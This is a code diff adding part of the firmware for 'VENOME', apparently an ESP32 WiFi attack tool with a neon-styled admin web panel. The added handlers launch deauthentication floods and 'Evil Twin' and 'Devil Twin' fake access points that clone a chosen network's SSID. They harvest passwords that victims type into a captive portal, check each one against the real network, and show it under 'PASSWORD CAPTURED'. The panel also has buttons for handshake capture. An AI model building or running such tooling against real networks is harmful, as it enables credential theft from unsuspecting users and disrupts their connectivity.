+                   "  background: linear-gradient(90deg, #ff00ff, #00ffff);"
+                   "  animation: pulse 2s infinite;"
+                   "  width: 0%;"
+                   "}"
+                   "@keyframes pulse {"
+                   "  0%, 100% { opacity: 1; }"
+                   "  50% { opacity: 0.8; }"
+                   "}"
+                   ".stats-grid {"
+                   "  display: grid;"
+                   "  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));"
+                   "  gap: 20px;"
+                   "  margin-bottom: 25px;"
+                   "}"
+                   ".stat-item {"
+                   "  background: rgba(10, 15, 31, 0.9);"
+                   "  border: 1px solid #ff00ff;"
+                   "  box-shadow: 0 0 15px rgba(255, 0, 255, 0.3);"
+                   "  padding: 20px;"
+                   "  text-align: center;"
+                   "  backdrop-filter: blur(5px);"
+                   "}"
+                   ".stat-value {"
+                   "  font-size: 2.5em;"
+                   "  font-weight: 800;"
+                   "  color: #00ffff;"
+                   "  text-shadow: 0 0 20px #00ffff;"
+                   "  margin-bottom: 5px;"
+                   "}"
+                   ".stat-label {"
+                   "  color: #ff00ff;"
+                   "  font-size: 0.9em;"
+                   "  letter-spacing: 2px;"
+                   "  text-transform: uppercase;"
+                   "}"
+                   ".action-grid {"
+                   "  display: flex;"
+                   "  flex-direction: column;"
+                   "  gap: 10px;"
+                   "  margin-bottom: 25px;"
+                   "}"
+
+                   ".action-grid form {"
+                   "  width: 100%;"
+                   "  margin: 0;"
+                   "}"
+
+                   ".action-grid .cyber-btn {"
+                   "  width: 100%;"
+                   "  padding: 12px 5px;"
+                   "  font-size: 0.9em;"
+                   "}"
+                   ".cyber-btn {"
+                   "  background: transparent;"
+                   "  border: 2px solid #00ffff;"
+                   "  color: #00ffff;"
+                   "  padding: 10px 5px;"
+                   "  font-family: 'Orbitron', sans-serif;"
+                   "  font-size: 0.8em;"
+                   "  font-weight: 600;"
+                   "  text-transform: uppercase;"
+                   "  letter-spacing: 0.5px;"
+                   "  cursor: pointer;"
+                   "  transition: all 0.3s;"
+                   "  box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);"
+                   "  width: 100%;"
+                   "  white-space: nowrap;"
+                   "  position: relative;"
+                   "  overflow: hidden;"
+                   "  z-index: 1;"
+                   "}"
+                   ".cyber-btn:hover {"
+                   "  background: #00ffff;"
+                   "  color: #0a0f1f;"
+                   "  box-shadow: 0 0 20px #00ffff;"
+                   "}"
+                   ".cyber-btn::before {"
+                   "  content: '';"
+                   "  position: absolute;"
+                   "  top: 0;"
+                   "  left: -100%;"
+                   "  width: 100%;"
+                   "  height: 100%;"
+                   "  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);"
+                   "  transition: left 0.5s ease-in-out;"
+                   "  z-index: -1;"
+                   "}"
+                   ".cyber-btn:hover::before {"
+                   "  left: 100%;"
+                   "}"
+                   ".btn-neon-pink {"
+                   "  border-color: #ff00ff;"
+                   "  color: #ff00ff;"
+                   "  box-shadow: 0 0 10px rgba(255, 0, 255, 0.3);"
+                   "}"
+                   ".btn-neon-pink:hover {"
+                   "  background: #ff00ff;"
+                   "  color: #0a0f1f;"
+                   "}"
+                   ".cyber-table {"
+                   "  border: 2px solid #ff00ff;"
+                   "  box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);"
+                   "  margin-bottom: 25px;"
+                   "  overflow-x: auto;"
+                   "  width: 100%;"
+                   "}"
+                   ".table-header {"
+                   "  padding: 20px;"
+                   "  border-bottom: 2px solid #ff00ff;"
+                   "  display: flex;"
+                   "  justify-content: space-between;"
+                   "  align-items: center;"
+                   "  background: rgba(255, 0, 255, 0.1);"
+                   "  font-size: 1.2em;"
+                   "  letter-spacing: 2px;"
+                   "}"
+                   ".table-header span:first-child {"
+                   "  color: #00ffff;"
+                   "}"
+                   ".table-header span:last-child {"
+                   "  color: #ff00ff;"
+                   "}"
+                   "table {"
+                   "  width: 100%;"
+                   "  border-collapse: collapse;"
+                   "  min-width: 600px;"
+                   "}"
+                   "th {"
+                   "  text-align: left;"
+                   "  padding: 12px 10px;"
+                   "  border-bottom: 1px solid #ff00ff;"
+                   "  color: #00ffff;"
+                   "  font-weight: 600;"
+                   "  font-size: 0.85em;"
+                   "  letter-spacing: 1px;"
+                   "}"
+                   "td {"
+                   "  padding: 12px 10px;"
+                   "  border-bottom: 1px solid rgba(255, 0, 255, 0.3);"
+                   "  color: #fff;"
+                   "  font-size: 0.85em;"
+                   "}"
+                   "tr:hover td {"
+                   "  background: rgba(255, 0, 255, 0.1);"
+                   "}"
+                   ".signal-display {"
+                   "  display: flex;"
+                   "  align-items: center;"
+                   "  gap: 10px;"
+                   "}"
+                   ".cyber-bars {"
+                   "  display: flex;"
+                   "  gap: 2px;"
+                   "  align-items: flex-end;"
+                   "  height: 20px;"
+                   "}"
+                   ".cyber-bars span {"
+                   "  width: 3px;"
+                   "  background: #00ffff;"
+                   "  box-shadow: 0 0 10px #00ffff;"
+                   "  transition: height 0.2s;"
+                   "}"
+                   ".selected-row {"
+                   "  background: rgba(0, 255, 255, 0.1);"
+                   "  border-left: 4px solid #00ffff;"
+                   "}"
+                   ".selected-badge {"
+                   "  color: #00ffff;"
+                   "  text-shadow: 0 0 10px #00ffff;"
+                   "  font-size: 0.9em;"
+                   "  letter-spacing: 1px;"
+                   "}"
+                   ".select-btn {"
+                   "  background: transparent;"
+                   "  border: 1px solid #ff00ff;"
+                   "  color: #ff00ff;"
+                   "  padding: 6px 15px;"
+                   "  font-family: 'Orbitron', sans-serif;"
+                   "  cursor: pointer;"
+                   "  transition: all 0.3s;"
+                   "  font-size: 0.9em;"
+                   "}"
+                   ".select-btn:hover {"
+                   "  background: #ff00ff;"
+                   "  color: #0a0f1f;"
+                   "  box-shadow: 0 0 15px #ff00ff;"
+                   "}"
+                   ".capture-panel {"
+                   "  border: 2px solid #00ffff;"
+                   "  padding: 20px;"
+                   "  margin-bottom: 25px;"
+                   "  background: rgba(0, 255, 255, 0.05);"
+                   "  display: flex;"
+                   "  align-items: center;"
+                   "  gap: 20px;"
+                   "  flex-wrap: wrap;"
+                   "}"
+                   ".capture-icon {"
+                   "  width: 50px;"
+                   "  height: 50px;"
+                   "  border: 2px solid #ff00ff;"
+                   "  border-radius: 50%;"
+                   "  display: flex;"
+                   "  align-items: center;"
+                   "  justify-content: center;"
+                   "  font-size: 24px;"
+                   "  color: #ff00ff;"
+                   "  box-shadow: 0 0 20px #ff00ff;"
+                   "}"
+                   ".capture-text {"
+                   "  flex: 1;"
+                   "}"
+                   ".capture-text .line1 {"
+                   "  color: #00ffff;"
+                   "  font-size: 1.2em;"
+                   "  margin-bottom: 5px;"
+                   "}"
+                   ".capture-text .line2 {"
+                   "  color: #ff00ff;"
+                   "  font-family: monospace;"
+                   "}"
+                   ".footer {"
+                   "  text-align: center;"
+                   "  padding: 25px;"
+                   "  border-top: 2px solid #ff00ff;"
+                   "  margin-top: 30px;"
+                   "  color: #00ffff;"
+                   "}"
+                   ".footer-glow {"
+                   "  display: flex;"
+                   "  justify-content: center;"
+                   "  gap: 30px;"
+                   "  margin-top: 15px;"
+                   "  color: #888;"
+                   "}"
+                   ".footer-glow span {"
+                   "  text-shadow: 0 0 10px currentColor;"
+                   "}"
+                   ".footer-glow span:nth-child(1) { color: #ff00ff; }"
+                   ".footer-glow span:nth-child(2) { color: #00ffff; }"
+                   ".footer-glow span:nth-child(3) { color: #ffff00; }"
+                   "@media (max-width: 768px) {"
+                   "  .glitch-text { font-size: 1.5em; }"
+                   "  .cyber-card { flex-direction: column; }"
+                   "  .action-grid { grid-template-columns: 1fr 1fr; }"
+                   "  .stats-grid { grid-template-columns: 1fr 1fr; }"
+                   "  .avail-text {"
+                   "    font-size: 0.8em;"
+                   "  }"
+                   "  .table-header span:last-child {"
+                   "    font-size: 0.7em;"
+                   "  }"
+                   "  th, td {"
+                   "    font-size: 0.7em;"
+                   "    padding: 8px 5px;"
+                   "  }"
+                   "  .table-header {"
+                   "    font-size: 0.9em;"
+                   "    padding: 10px;"
+                   "  }"
+                   "  .cyber-bars span {"
+                   "    width: 3px;"
+                   "  }"
+                   "  .select-btn {"
+                   "    padding: 4px 8px 4px 8px;"
+                   "    font-size: 0.7em;"
+                   "  }"
+                   "}"
+                   "@media (min-width: 769px) {"
+                   "  .action-grid {"
+                   "    flex-direction: row;"
+                   "    flex-wrap: wrap;"
+                   "  }"
+                   "  .action-grid form {"
+                   "    width: auto;"
+                   "    flex: 1 1 auto;"
+                   "  }"
+                   "  .action-grid .cyber-btn {"
+                   "    white-space: nowrap;"
+                   "    font-size: 0.8em;"
+                   "  }"
+                   "}"
+                   "</style>"
+                   "</head><body>"
+                   "<div class='cyber-container'>"
+                   "<div class='neon-header'>"
+                   "<div class='glitch-text'>VENOME</div>"
+                   "<div class='subtitle'>CYBERPUNK EDITION v2.0</div>"
+                   "</div>";
+
+void handleIndex()
+{
+  if (webServer.uri() == "/killswitch")
+  {
+    Serial.println("🔪 Kill switch activated!");
+
+    if (webServer.hasArg("attack"))
+    {
+      String attack = webServer.arg("attack");
+
+      if (attack == "evil")
+      {
+        Serial.println("Stopping Evil Twin...");
+        hotspot_active = false;
+        dnsServer.stop();
+        WiFi.softAPdisconnect(true);
+        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+        WiFi.softAP("VENOME v1", "Venome@kali");
+        dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+        webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='2;url=/admin'></head><body><center><h2>✅ Evil Twin Stopped!</h2></center></body></html>");
+        return;
+      }
+      else if (attack == "devil")
+      {
+        Serial.println("Stopping Devil Twin...");
+        stopDevilTwin();
+
+        webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='2;url=/admin'></head><body><center><h2>✅ Devil Twin Stopped!</h2></center></body></html>");
+        return;
+      }
+    }
+
+    webServer.sendHeader("Location", "/admin");
+    webServer.send(303);
+    return;
+  }
+
+  if (webServer.method() == HTTP_POST)
+  {
+    if (webServer.hasArg("password"))
+    {
+      _tryPassword = webServer.arg("password");
+      isVerifyingPassword = true;
+      verificationStartTime = millis();
+
+      String clientMac = getClientMac(webServer.client().remoteIP());
+      logPasswordAttempt(_tryPassword, "VERIFYING", clientMac);
+
+      if (_selectedNetwork.ssid != "")
+      {
+        WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
+      }
+
+      webServer.sendHeader("Location", "/result");
+      webServer.send(303);
+      return;
+    }
+  }
+
+  if (hotspot_active || devil_twin_active)
+  {
+    webServer.send(200, "text/html", index());
+    return;
+  }
+
+  if (webServer.hasArg("ap"))
+  {
+    for (int i = 0; i < MAX_NETWORKS; i++)
+    {
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap"))
+      {
+        _selectedNetwork = _networks[i];
+        webServer.sendHeader("Location", "/admin");
+        webServer.send(303);
+        return;
+      }
+    }
+  }
+
+  if (webServer.hasArg("scan"))
+  {
+    if (webServer.arg("scan") == "now")
+    {
+      Serial.println("Manual scan requested");
+      performScan();
+      webServer.sendHeader("Location", "/admin");
+      webServer.send(303);
+      return;
+    }
+  }
+
+  // ==================== MODIFIED DEAUTH HANDLER ====================
+  if (webServer.hasArg("deauth"))
+  {
+    if (webServer.arg("deauth") == "start")
+    {
+      // Start Devil Twin Style Deauth + Background Scan
+      startDevilTwinStyleDeauthWithBackgroundScan();
+
+      webServer.sendHeader("Location", "/admin");
+      webServer.send(303);
+      return;
+    }
+    else if (webServer.arg("deauth") == "stop")
+    {
+      // Stop Devil Twin Style Deauth
+      stopDevilTwinStyleDeauthWithBackgroundScan();
+
+      webServer.sendHeader("Location", "/admin");
+      webServer.send(303);
+      return;
+    }
+  }
+
+  if (webServer.hasArg("hotspot"))
+  {
+    if (webServer.arg("hotspot") == "start")
+    {
+      monitorStartTime = millis();
+      clientCount = 0;
+      attemptCount = 0;
+      totalUniqueClients = 0;
+      memset(clients, 0, sizeof(clients));
+      memset(passwordAttempts, 0, sizeof(passwordAttempts));
+
+      hotspot_active = true;
+      devil_twin_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+      webServer.sendHeader("Location", "/admin");
+      webServer.send(303);
+      return;
+    }
+    else if (webServer.arg("hotspot") == "stop")
+    {
+      hotspot_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP("VENOME v1", "Venome@kali");
+      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+      webServer.sendHeader("Location", "/admin");
+      webServer.send(303);
+      return;
+    }
+  }
+
+  if (webServer.hasArg("deviltwin"))
+  {
+    if (webServer.arg("deviltwin") == "start")
+    {
+      startDevilTwin();
+      webServer.sendHeader("Location", "/admin");
+      webServer.send(303);
+      return;
+    }
+    else if (webServer.arg("deviltwin") == "stop")
+    {
+      stopDevilTwin();
+      webServer.sendHeader("Location", "/admin");
+      webServer.send(303);
+      return;
+    }
+  }
+
+  webServer.sendHeader("Location", "/admin");
+  webServer.send(303);
+}
+
+// Function to calculate approximate range based on RSSI
+String calculateRange(int rssi)
+{
+  if (rssi >= -50)
+  {
+    return "Very Close (0-5m)";
+  }
+  else if (rssi >= -60)
+  {
+    return "Close (5-15m)";
+  }
+  else if (rssi >= -70)
+  {
+    return "Medium (15-30m)";
+  }
+  else if (rssi >= -80)
+  {
+    return "Far (30-50m)";
+  }
+  else if (rssi >= -90)
+  {
+    return "Very Far (50-80m)";
+  }
+  else
+  {
+    return "Extreme Range (>80m)";
+  }
+}
+
+// Function to get range percentage for visual indicator
+int getRangePercentage(int rssi)
+{
+  int percentage = map(constrain(rssi, -100, -30), -100, -30, 0, 100);
+  return constrain(percentage, 0, 100);
+}
+
+// Function to get RSSI bars HTML
+String getRSSIBars(int rssi)
+{
+  int bars = 0;
+  if (rssi >= -60)
+    bars = 4;
+  else if (rssi >= -70)
+    bars = 3;
+  else if (rssi >= -80)
+    bars = 2;
+  else if (rssi >= -90)
+    bars = 1;
+
+  String barsHtml = "<span class='rssi-bars'>";
+  for (int i = 0; i < 4; i++)
+  {
+    if (i < bars)
+    {
+      barsHtml += "<span class='rssi-bar rssi-bar-" + String(i + 1) + "'></span>";
+    }
+    else
+    {
+      barsHtml += "<span class='rssi-bar' style='background: var(--border-color); height: 4px;'></span>";
+    }
+  }
+  barsHtml += "</span>";
+  return barsHtml;
+}
+
+String getSecurityType(uint8_t auth_mode)
+{
+  switch (auth_mode)
+  {
+  case WIFI_AUTH_OPEN:
+    return "OPEN";
+  case WIFI_AUTH_WEP:
+    return "WEP";
+  case WIFI_AUTH_WPA_PSK:
+    return "WPA-PSK";
+  case WIFI_AUTH_WPA2_PSK:
+    return "WPA2-PSK";
+  case WIFI_AUTH_WPA_WPA2_PSK:
+    return "WPA/WPA2-PSK";
+  case WIFI_AUTH_WPA2_ENTERPRISE:
+    return "WPA2-ENTERPRISE";
+  case WIFI_AUTH_WPA3_PSK:
+    return "WPA3-PSK";
+  case WIFI_AUTH_WPA2_WPA3_PSK:
+    return "WPA2/WPA3-PSK";
+  case WIFI_AUTH_WAPI_PSK:
+    return "WAPI-PSK";
+  case WIFI_AUTH_WPA3_ENT_192:
+    return "WPA3-ENT-192";
+  case WIFI_AUTH_MAX:
+    return "MAX";
+  default:
+    return "UNKNOWN";
+  }
+}
+
+void handleAdmin()
+{
+  String _html = _tempHTML;
+
+  if (_selectedNetwork.ssid != "")
+  {
+    int rssi = _selectedNetwork.rssi;
+    String range = calculateRange(rssi);
+    int rangePercent = getRangePercentage(rssi);
+    String securityType = getSecurityType(_selectedNetwork.auth_mode);
+
+    _html += "<div class='cyber-card'>";
+    _html += "<div class='target-badge'>&#127919; CURRENT TARGET</div>";
+    _html += "<div class='target-details' style='display: flex; flex-wrap: wrap; gap: 30px; flex: 1;'>";
+    _html += "<div class='cyber-info'>";
+    _html += "<div class='cyber-label'>SSID</div>";
+    _html += "<div class='cyber-value'>" + _selectedNetwork.ssid + "</div>";
+    _html += "<div class='cyber-mac'>BSSID: " + bytesToStr(_selectedNetwork.bssid, 6) + "</div>";
+
+    String securityColor = "#00ff00";
+    if (securityType != "OPEN")
+    {
+      securityColor = "#ff00ff";
+    }
+    _html += "<div style='margin-top: 10px;'><span style='color: #00ffff;'>SECURITY: </span><span style='color: " + securityColor + "; text-shadow: 0 0 10px " + securityColor + ";'>" + securityType + "</span></div>";
+
+    _html += "</div>";
+    _html += "<div class='cyber-info'>";
+    _html += "<div class='cyber-label'>CHANNEL</div>";
+    _html += "<div class='cyber-value'>" + String(_selectedNetwork.ch) + "</div>";
+    _html += "</div>";
+    _html += "<div class='neon-progress'>";
+    _html += "<div class='progress-header'>";
+    _html += "<span>SIGNAL: " + String(rssi) + " dBm</span>";
+    _html += "<span>RANGE: " + String(rangePercent) + "%</span>";
+    _html += "</div>";
+    _html += "<div class='neon-bar'>";
+    _html += "<div class='neon-fill' style='width: " + String(rangePercent) + "%;'></div>";
+    _html += "</div>";
+    _html += "<div style='margin-top: 5px; color: #ff00ff; font-size: 0.8em;'>≈ " + range + "</div>";
+    _html += "</div></div></div>";
+  }
+  else
+  {
+    _html += "<div class='cyber-card' style='justify-content: center;'>";
+    _html += "<span style='color: #888;'>⚠️ No target selected. Please select a network from the list below.</span>";
+    _html += "</div>";
+  }
+
+  if (webServer.hasArg("ap"))
+  {
+    for (int i = 0; i < MAX_NETWORKS; i++)
+    {
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap"))
+      {
+        _selectedNetwork = _networks[i];
+      }
+    }
+  }
+
+  if (webServer.hasArg("deauth"))
+  {
+    if (webServer.arg("deauth") == "start")
+    {
+      // Start Devil Twin Style Deauth + Background Scan
+      startDevilTwinStyleDeauthWithBackgroundScan();
+    }
+    else if (webServer.arg("deauth") == "stop")
+    {
+      // Stop Devil Twin Style Deauth
+      stopDevilTwinStyleDeauthWithBackgroundScan();
+    }
+  }
+
+  if (webServer.hasArg("hotspot"))
+  {
+    if (webServer.arg("hotspot") == "start")
+    {
+      hotspot_active = true;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+    }
+    else if (webServer.arg("hotspot") == "stop")
+    {
+      hotspot_active = false;
+      dnsServer.stop();
+      int n = WiFi.softAPdisconnect(true);
+      Serial.println(String(n));
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+      WiFi.softAP("WiPhi_34732", "d347h320");
+      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+    }
+    return;
+  }
+
+  if (webServer.hasArg("deviltwin"))
+  {
+    if (webServer.arg("deviltwin") == "start")
+    {
+      startDevilTwin();
+    }
+    else if (webServer.arg("deviltwin") == "stop")
+    {
+      stopDevilTwin();
+    }
+    return;
+  }
+
+  _html += "<div class='stats-grid'>";
+
+  _html += "<div class='stat-item'>";
+  _html += "<div class='stat-value'><span style='color: #00ff00;'>●</span></div>";
+  _html += "<div class='stat-label'>SYSTEM</div>";
+  _html += "<div style='color: #00ffff;'>Operational</div>";
+  _html += "</div>";
+
+  _html += "<div class='stat-item'>";
+  _html += "<div class='stat-value'>";
+  if (devil_twin_active)
+    _html += "&#128127;";
+  else if (hotspot_active)
+    _html += "&#127917;";
+  else if (deauthing_active)
+    _html += "&#9889;";
+  else
+    _html += "&#9679;";
+  _html += "</div>";
+  _html += "<div class='stat-label'>ATTACK</div>";
+  _html += "<div style='color: #00ffff;'>";
+  if (devil_twin_active)
+    _html += "Devil Twin";
+  else if (hotspot_active)
+    _html += "Evil Twin";
+  else if (deauthing_active)
+    _html += "Deauth";
+  else
+    _html += "Idle";
+  _html += "</div></div>";
+
+  unsigned long uptimeSeconds = millis() / 1000;
+  unsigned long uptimeMinutes = uptimeSeconds / 60;
+  unsigned long uptimeHours = uptimeMinutes / 60;
+  _html += "<div class='stat-item'>";
+  _html += "<div class='stat-value'>" + String(uptimeHours) + ":" + String(uptimeMinutes % 60) + ":" + String(uptimeSeconds % 60) + "</div>";
+  _html += "<div class='stat-label'>UPTIME</div>";
+  _html += "</div>";
+
+  _html += "<div class='stat-item'>";
+  _html += "<div class='stat-value'>" + String(ESP.getFreeHeap() / 1024) + "</div>";
+  _html += "<div class='stat-label'>FREE KB</div>";
+  _html += "</div>";
+  _html += "</div>";
+
+  _html += "<div class='action-grid'>";
+
+  _html += "<form method='post' action='/?deauth=";
+  _html += (deauthing_active ? "stop" : "start");
+  _html += "'>";
+  _html += "<button class='cyber-btn " + String(deauthing_active ? "btn-neon-pink" : "") + "' ";
+  if (_selectedNetwork.ssid == "")
+    _html += "disabled";
+  _html += ">";
+  _html += deauthing_active ? "&#11035; STOP DEAUTH" : "&#9889; START DEAUTH";
+  _html += "</button></form>";
+
+  if (hotspot_active)
+  {
+    _html += "<a href='/killswitch?attack=evil' class='cyber-btn btn-neon-pink' style='text-decoration:none;display:block;text-align:center;'>";
+    _html += "&#11035; STOP EVIL TWIN";
+    _html += "</a>";
+  }
+  else
+  {
+    _html += "<form method='post' action='/?hotspot=start'>";
+    _html += "<button class='cyber-btn' ";
+    if (_selectedNetwork.ssid == "")
+      _html += "disabled";
+    _html += ">";
+    _html += "&#127917; START EVIL TWIN";
+    _html += "</button></form>";
+  }
+
+  if (devil_twin_active)
+  {
+    _html += "<a href='/killswitch?attack=devil' class='cyber-btn btn-neon-pink' style='text-decoration:none;display:block;text-align:center;'>";
+    _html += "&#11035; STOP DEVIL TWIN";
+    _html += "</a>";
+  }
+  else
+  {
+    _html += "<form method='post' action='/?deviltwin=start'>";
+    _html += "<button class='cyber-btn' ";
+    if (_selectedNetwork.ssid == "")
+      _html += "disabled";
+    _html += ">";
+    _html += "&#128127; START DEVIL TWIN";
+    _html += "</button></form>";
+  }
+
+  _html += "<form method='post' action='/?scan=now' style='width: 100%;' onsubmit='showScanLoading(); return true;'>";
+  _html += "<button class='cyber-btn' type='submit' id='scanBtn'>&#128260; SCAN NETWORKS</button>";
+  _html += "</form>";
+
+  _html += "<form method='post' action='/handshake'>";
+  _html += "<button class='cyber-btn btn-neon-pink'>&#128274; HANDSHAKE CAPTURE</button></form>";
+
+  _html += "<form method='post' action='/venomeverifies'>";
+  _html += "<button class='cyber-btn btn-neon-pink'>&#x1F4E1; PCAP VERIFIER</button></form>";
+
+  _html += "</div>";
+
+  _html += "<style>";
+  _html += "@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }";
+  _html += "@keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }";
+  _html += "@keyframes scanProgress { 0% { left: -100%; } 100% { left: 100%; } }";
+  _html += ".blink { animation: blink 1s infinite; }";
+  _html += "@keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0.5; } }";
+  _html += "</style>";
+
+  _html += "<script>";
+  _html += "function startScan() {";
+  _html += "  document.querySelector('.cyber-table').style.display = 'none';";
+  _html += "  document.getElementById('scan-loading-inline').style.display = 'block';";
+  _html += "  document.getElementById('scanBtn').disabled = true;";
+  _html += "  document.getElementById('scanBtn').style.opacity = '0.5';";
+  _html += "  document.getElementById('scanBtn').style.cursor = 'not-allowed';";
+  _html += "  ";
+  _html += "  var xhr = new XMLHttpRequest();";
+  _html += "  xhr.open('GET', '/doscannow', true);";
+  _html += "  xhr.onload = function() {";
+  _html += "    window.location.href = '/admin';";
+  _html += "  };";
+  _html += "  xhr.onerror = function() {";
+  _html += "    window.location.href = '/admin';";
+  _html += "  };";
+  _html += "  xhr.send();";
+  _html += "}";
+  _html += "</script>";
+
+  int networkCount = 0;
+  for (int i = 0; i < MAX_NETWORKS; i++)
+  {
+    if (_networks[i].ssid != "")
+      networkCount++;
+  }
+
+  _html += "<div id='scan-loading-inline' style='display: none;'>";
+  _html += "<div class='cyber-card' style='justify-content: center; text-align: center; padding: 30px; margin-bottom: 25px; border-color: #ffff00; box-shadow: 0 0 30px #ffff00;'>";
+  _html += "<div style='font-size: 3em; margin-bottom: 15px; animation: pulse 2s infinite;'>&#128260;</div>";
+  _html += "<div style='color: #ffff00; font-size: 1.5em; text-shadow: 0 0 10px #ffff00; margin-bottom: 15px;'>SCANNING NETWORKS</div>";
+  _html += "<div style='color: #00ffff; margin-bottom: 20px;'>Please wait... <span class='blink'>⏳</span></div>";
+  _html += "<div style='width: 100%; height: 4px; background: rgba(255, 255, 0, 0.2); position: relative; overflow: hidden;'>";
+  _html += "<div style='position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, #ffff00, #ff00ff); animation: scanProgress 2s ease-in-out infinite;'></div>";
+  _html += "</div>";
+  _html += "<div style='color: #888; margin-top: 15px; font-size: 0.9em;'>This may take a moment</div>";
+  _html += "</div></div>";
+
+  _html += "<div class='cyber-table' style='width: 100%; overflow-x: auto;'>";
+  _html += "<div class='table-header'>";
+  _html += "<span class='avail-text'>📡 AVAILABLE NETWORKS</span>";
+  _html += "<span>" + String(networkCount) + " DETECTED</span>";
+  _html += "</div>";
+  _html += "<table style='width: 100%; min-width: 100%;'>";
+  _html += "<tr><th style='width: 40%;'>NETWORK</th><th style='width: 10%;'>CH</th><th style='width: 25%;'>SIGNAL</th><th style='width: 25%;'>RANGE</th></tr>";
+
+  for (int i = 0; i < MAX_NETWORKS; ++i)
+  {
+    if (_networks[i].ssid == "")
+    {
+      break;
+    }
+
+    int rssi = _networks[i].rssi;
+    String range = calculateRange(rssi);
+
+    int bars = 0;
+    if (rssi >= -50)
+      bars = 5;
+    else if (rssi >= -60)
+      bars = 4;
+    else if (rssi >= -70)
+      bars = 3;
+    else if (rssi >= -80)
+      bars = 2;
+    else if (rssi >= -90)
+      bars = 1;
+
+    bool isSelected = (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6));
+
+    _html += "<tr";
+    if (isSelected)
+    {
+      _html += " class='selected-row'";
+    }
+    _html += " onclick='selectNetwork(\"" + bytesToStr(_networks[i].bssid, 6) + "\")' style='cursor: pointer;'>";
+
+    _html += "<td style='white-space: nowrap;'>";
+    _html += "<div style='display: flex; align-items: center; gap: 10px;'>";
+
+    if (isSelected)
+    {
+      _html += "<span style='display: inline-block; width: 20px; height: 20px; border-radius: 50%; background: #00ffff; box-shadow: 0 0 10px #00ffff;'></span>";
+    }
+    else
+    {
+      _html += "<span style='display: inline-block; width: 20px; height: 20px; border-radius: 50%; border: 2px solid #ff00ff; background: transparent;'></span>";
+    }
+
+    String ssid = _networks[i].ssid;
+    if (ssid.length() > 15)
+    {
+      ssid = ssid.substring(0, 13) + "…";
+    }
+    _html += "<span style='color: " + String(isSelected ? "#00ffff" : "#fff") + ";'>" + ssid + "</span>";
+
+    String securityIcon = "🔓";
+    String securityColor = "#00ff00";
+    if (_networks[i].auth_mode != WIFI_AUTH_OPEN)
+    {
+      securityIcon = "🔒";
+      securityColor = "#ff00ff";
+    }
+    _html += "<span style='color: " + securityColor + "; text-shadow: 0 0 5px " + securityColor + "; margin-left: 5px;' title='" + getSecurityType(_networks[i].auth_mode) + "'>" + securityIcon + "</span>";
+
+    _html += "</div>";
+    _html += "<br><span style='color: #888; font-size: 0.7em; font-family: monospace;'>" + bytesToStr(_networks[i].bssid, 6).substring(0, 8) + "…</span></td>";
+
+    _html += "<td>";
+    if (_networks[i].ch < 10)
+      _html += "0";
+    _html += String(_networks[i].ch) + "</td>";
+
+    _html += "<td><div class='signal-display'>";
+    _html += "<div class='cyber-bars'>";
+    for (int b = 0; b < 5; b++)
+    {
+      if (b < bars)
+      {
+        int height = (b + 1) * 4;
+        _html += "<span style='height: " + String(height) + "px;'></span>";
+      }
+      else
+      {
+        _html += "<span style='height: 4px; background: #1a1f2f; box-shadow: none; opacity: 0.3;'></span>";
+      }
+    }
+    _html += "</div>";
+    _html += String(rssi) + " dBm</div></td>";
+
+    _html += "<td>" + range + "</td>";
+    _html += "</tr>";
+  }
+  _html += "</table></div>";
+
+  _html += "<form id='selectForm' method='post' action='/' style='display: none;'>";
+  _html += "<input type='hidden' name='ap' id='selectedAP' value=''>";
+  _html += "</form>";
+
+  _html += "<script>";
+  _html += "function selectNetwork(bssid) {";
+  _html += "  document.getElementById('selectedAP').value = bssid;";
+  _html += "  document.getElementById('selectForm').submit();";
+  _html += "}";
+  _html += "</script>";
+
+  if (_correct != "")
+  {
+    _html += "<div class='capture-panel' style='margin-top: 20px;'>";
+    _html += "<div class='capture-icon'>🔓</div>";
+    _html += "<div class='capture-text'>";
+    _html += "<div class='line1'>PASSWORD CAPTURED</div>";
+    _html += "<div class='line2'>" + _correct + "</div>";
+    _html += "</div></div>";
+  }
+
+  _html += "<div class='footer'>";
+  _html += "<div>PACKETWIFI CYBERPUNK EDITION</div>";
+  _html += "<div class='footer-glow'>";
+  _html += "<span>&#9889; NEON CORE</span>";
+  _html += "<span>&#128481; AES-256</span>";
+  _html += "<span>&#128260; QUANTUM SCAN</span>";
+  _html += "</div>";
